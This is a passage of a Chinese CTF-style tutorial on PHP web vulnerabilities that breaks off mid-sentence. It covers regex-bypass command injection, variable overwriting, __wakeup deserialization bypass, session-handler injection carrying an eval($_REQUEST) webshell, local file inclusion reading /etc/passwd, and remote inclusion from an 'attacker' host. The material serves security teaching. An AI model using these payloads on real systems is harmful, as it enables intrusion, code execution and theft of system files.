<p><a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami</a></p>
<p>如果开启了/m，会存在绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&quot;/^[a-zA-Z0-9-s_]+.rpt$/m&quot;</span>, <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;regex failed&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> exec(<span class="string">&quot;/usr/bin/file -i -b &quot;</span>.<span class="variable">$file_name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后^和$的含义就发生了变化，没开启多行模式之前(即单行匹配模式), ^ 和$ 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。</p>
<p><a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami</a></p>
<p>开启/m</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">^ 行首</span><br><span class="line"><span class="variable">$</span> 行尾</span><br></pre></td></tr></table></figure>

<p>不开启/m</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">^ 字符串的开始</span><br><span class="line"><span class="variable">$</span> 字符串的结尾</span><br></pre></td></tr></table></figure>

<p>修饰符说明</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">i 在和正则匹配是不区分大小写 </span><br><span class="line">m 将字符串视为多行。默认的正则开始“^”和结束“<span class="variable">$</span>”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“<span class="variable">$</span>”。 </span><br><span class="line">o 评估表达式只有一次</span><br><span class="line">s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 </span><br><span class="line">x 忽略空白，除非进行转义的不被忽略。 </span><br><span class="line">g 在全局范围内找到所有匹配</span><br><span class="line">cg 即使全局匹配失败也允许搜索继续</span><br></pre></td></tr></table></figure>

<h2 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h2><p>正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE</p>
<h2 id="ereg-00-截断"><a href="#ereg-00-截断" class="headerlink" title="ereg %00 截断"></a>ereg %00 截断</h2><p>ereg 读到 %00 的时候，就截止了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="literal">FALSE</span>)  &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphabet&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里 a=abcd%001234，可以绕过</p>
<h1 id="7-变量覆盖"><a href="#7-变量覆盖" class="headerlink" title="7. 变量覆盖"></a>7. 变量覆盖</h1><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$auth</span> = <span class="string">&#x27;0&#x27;</span>;  </span><br><span class="line">    <span class="comment">// 这里可以覆盖$auth的变量值</span></span><br><span class="line">    extract(<span class="variable">$_GET</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$auth</span> == <span class="number">1</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">//var.php?var=new  </span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;init&#x27;</span>;  </span><br><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">// <span class="variable">$var</span> 会变成 new</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>;</span><br></pre></td></tr></table></figure>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="$$ 变量覆盖"></a>$$ 变量覆盖</h2><p>如果把变量本身的 key 也当变量，也就是使用了 $$，就可能存在问题。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line">// <span class="variable">$</span><span class="variable">$_</span> 是等于 <span class="variable">$_POST</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1/index.php?_CONFIG=123</span></span><br><span class="line"><span class="variable">$_CONFIG</span>[<span class="string">&#x27;extraSecure&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$method</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="comment">// $key == _CONFIG</span></span><br><span class="line">      <span class="comment">// $$key == $_CONFIG</span></span><br><span class="line">      <span class="comment">// 这个函数会把 $_CONFIG 变量销毁</span></span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_CONFIG</span>[<span class="string">&#x27;extraSecure&#x27;</span>] == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag &#123;****&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数组类型数据的覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php?_SESSION[userinfo][id]=1&amp;_SESSION[userinfo][username]=admin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)  </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$$_key</span>=  <span class="variable">$_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;userinfo&quot;</span>][<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;userinfo&quot;</span>][<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>但是如果后面有 session_start() 会重新初始化上面的 $_SESSION 数据，因此又被还原回去。</p>
<h1 id="8-unset"><a href="#8-unset" class="headerlink" title="8. unset"></a>8. unset</h1><p>unset($bar); 用来销毁指定的变量，如果变量 $bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。</p>
<p>特殊的 PHP 代码格式</p>
<p>以这种后缀结尾的 php 文件也能被解析，这是在 fast-cgi 里面配置的</p>
<p>.php2    .php3    .php4    .php5    .php7    .phtml</p>
<p>正则检测文件内容中包含 &lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># 除了 php <span class="number">7.0</span> 不允许外，其他都允许</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">echo base64_encode(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果在 php.ini 文件中配置允许 ASP 风格的标签</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">; Allow ASP<span class="literal">-style</span> &lt;% %&gt; tags.</span><br><span class="line">; http://php.net/asp<span class="literal">-tags</span></span><br><span class="line">asp_tags = On</span><br></pre></td></tr></table></figure>

<p>则可以使用该方式</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;% <span class="built_in">echo</span> <span class="string">&#x27;a&#x27;</span>; %&gt;</span><br></pre></td></tr></table></figure>

<p>php.ini 文件中配置 short_open_tag 默认为 Off，如果为 On，则允许这种代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  <span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果等于 echo ‘a’;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="string">&#x27;a&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="10-伪随机数"><a href="#10-伪随机数" class="headerlink" title="10. 伪随机数"></a>10. 伪随机数</h1><h2 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h2><p>mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$seed</span> = <span class="number">12345</span>;</span><br><span class="line">mt_rand(<span class="variable">$seed</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ss</span> = mt_rand();</span><br></pre></td></tr></table></figure>

<p>linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。<br>但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 php_mt_seed。</p>
<p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>
<h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看这里。产生的随机数可以用下面这个公式预测:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一般预测值可能比实际值要差1</span></span><br><span class="line">state[<span class="type">i</span>] = state[<span class="type">i</span>-<span class="number">3</span>] + state[<span class="type">i</span>-<span class="number">31</span>]</span><br></pre></td></tr></table></figure>

<p>可以用下面的代码验证一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$randStr</span> = <span class="keyword">array</span>(); </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">50</span>;<span class="variable">$i</span>++) &#123;  <span class="comment">//先产生 32个随机数 </span></span><br><span class="line">    <span class="variable">$randStr</span>[<span class="variable">$i</span>]=rand(<span class="number">0</span>,<span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&gt;=<span class="number">31</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;<span class="subst">$randStr</span>[<span class="subst">$i</span>]=(&quot;</span>.<span class="variable">$randStr</span>[<span class="variable">$i</span>-<span class="number">31</span>].<span class="string">&quot;+&quot;</span>.<span class="variable">$randStr</span>[<span class="variable">$i</span>-<span class="number">3</span>].<span class="string">&quot;) mod 31&quot;</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="11-反序列化"><a href="#11-反序列化" class="headerlink" title="11. 反序列化"></a>11. 反序列化</h1><ul>
<li>__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
<li>__destruct()：析构函数，当对象被销毁时会自动调用。   </li>
<li> __wakeup() ：如前所提，unserialize()时会自动调用。</li>
</ul>
<p>PHP unserialize() 后会导致 __wakeup() 或 __destruct() 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 __wakeup() 或 __destruct() 中。</p>
<h2 id="wakeup-函数绕过"><a href="#wakeup-函数绕过" class="headerlink" title="__wakeup 函数绕过"></a>__wakeup 函数绕过</h2><p>PHP 有个 Bug，触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10，该漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo serialize(new xctf());</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;****&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用这个 payload 绕过 __wakeup 函数</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span></span><br><span class="line">http://www.example.com/index.php?code=O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 __wakeup 函数，从而绕过该函数。</p>
<h2 id="变量可以用引用"><a href="#变量可以用引用" class="headerlink" title="变量可以用引用"></a>变量可以用引用</h2><p>可以通过将变量的值存储为另外一个变量的地址，类似于 C 语言中的引用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> just4fun();</span><br><span class="line"><span class="variable">$a</span>-&gt;secret = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="comment">// 这里的 &amp; 跟 C 语言一样，是取 $a-&gt;secret 值的地址赋给 $a-&gt;enter</span></span><br><span class="line"><span class="variable">$a</span>-&gt;enter = &amp;<span class="variable">$a</span>-&gt;secret;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = unserialize(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123; </span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;xxxxxxx&quot;</span>;</span><br><span class="line">    <span class="comment">// 因为 $o-&gt;enter 存储的是 $o-&gt;secret 的值的地址，因此比较的时候相等的</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter) </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my Key: &quot;</span> . <span class="variable">$o</span>-&gt;secret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小特性"><a href="#小特性" class="headerlink" title="小特性"></a>小特性</h2><p>以下两个都能够被unserialize反序列化，且结果相同。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>不光object类型处理可以多一个’+’,其他类型也可以。但是如果要进一步通过修改变量的个数来绕过 __wakeup，在 php 5.5 环境下可以，php 5.6 环境下反序列化会失败</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  php 5.5 环境下可以绕过 __wakeup，php 5.6 环境下反序列化会失败</span></span><br><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Session-反序列化"><a href="#Session-反序列化" class="headerlink" title="Session 反序列化"></a>Session 反序列化</h2><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：<br>|处理器|对应的存储格式  |<br>|–|–|<br>|PHP  | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 |<br>|php_binary |键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值|<br>|php_serialize(php&gt;=5.5.4)| 经过 serialize() 函数反序列处理的数组 |</p>
<p>如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ryat&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ryat&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当访问 foo1.php 时，提交数据如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">foo1.php?ryat=|O:<span class="number">4</span>:<span class="string">&quot;ryat&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;hi&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ryat&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象。这个场景的利用需要能够构造 Session 的值，如果没有提供写入 Session 的地方，可以利用 Session Upload Progress。</p>
<hr>
<p>  注意：<font color='red'>如果利用这种方式上传了 webshell，读取文件的时候需要使用绝对路径，例如<br>   /opt/lampp/htdocs/index.php</font></p>
<hr>
<h2 id="Session-Upload-Progress"><a href="#Session-Upload-Progress" class="headerlink" title="Session Upload Progress"></a>Session Upload Progress</h2><p>上传文件时，如果 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的变量，就可以将 filename 的值赋值到session 中，filename 的值如果包含双引号，还需要进行转义，上传的页面的写法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://example.com/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>最后 Session 就会保存上传的文件名。如果没有提供写入 Session 的地方，可以用这种方法。POST 请求的数据包：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: web.jarvisoj.com:<span class="number">32784</span></span><br><span class="line">Content<span class="literal">-Type</span>: multipart/form<span class="literal">-data</span>; boundary=---<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">63.0</span>.<span class="number">3208.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cookie: PHPSESSID=jfdu23je5jlu43sfgc3akp3037</span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">302</span></span><br><span class="line"></span><br><span class="line">-----<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span></span><br><span class="line">Content<span class="literal">-Disposition</span>: form<span class="literal">-data</span>; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">123</span></span><br><span class="line">-----<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span></span><br><span class="line">Content<span class="literal">-Disposition</span>: form<span class="literal">-data</span>; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;|O:5:\&quot;</span>OowoO\<span class="string">&quot;:1:&#123;s:4:\&quot;</span>mdzz\<span class="string">&quot;;s:39:\&quot;</span><span class="built_in">echo</span> \<span class="string">&quot;waterfood\&quot;</span>; eval(<span class="variable">$_REQUEST</span>[\<span class="string">&quot;v\&quot;</span>]);\<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">Content<span class="literal">-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line"><span class="number">123</span></span><br><span class="line">-----<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span>--</span><br></pre></td></tr></table></figure>

<h1 id="12-文件包含"><a href="#12-文件包含" class="headerlink" title="12. 文件包含"></a>12. 文件包含</h1><p>这种 url 很容易就能想到可能是文件包含或者伪协议读取</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">10.2</span>.<span class="number">1.1</span>:<span class="number">20770</span>/index.php?page=upload</span><br><span class="line">http://<span class="number">10.2</span>.<span class="number">1.1</span>:<span class="number">20770</span>/index.php?page=php://<span class="keyword">filter</span>/read=convert.base64<span class="literal">-encode</span>/resource=upload</span><br></pre></td></tr></table></figure>

<p>常见的导致文件包含的函数有</p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
<li>fopen()</li>
<li>readfile()</li>
</ul>
<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>本地文件包含，Local File Inclusion，LFI。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;/home/wwwrun/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;/home/wwwrun/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 /etc/passwd 文件内容。</p>
<h2 id="00-截断"><a href="#00-截断" class="headerlink" title="%00 截断"></a>%00 截断</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效。</p>
<h2 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/./././././././././././.</span><br></pre></td></tr></table></figure>

<p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
<h2 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=../../../../../../../../../boot.ini/………………</span><br></pre></td></tr></table></figure>

<p>只适用 Windows，点号需要长于 256。</p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>远程文件包含，Remote File Inclusion，RFI。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$route</span> == <span class="string">&quot;share&quot;</span>) &#123;</span><br><span class="line">  require_once <span class="variable">$basePath</span> . <span class="string">&quot;/action/m_share.php&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$route</span> == <span class="string">&quot;sharelink&quot;</span>) &#123;</span><br><span class="line">  require_once <span class="variable">$basePath</span> . <span class="string">&quot;/action/m_sharelink.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造变量 basePath 的值。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/?basePath=http://attacker/phpshell.txt?</span><br></pre></td></tr></table></figure>

<p>最终的代码执行了</p>
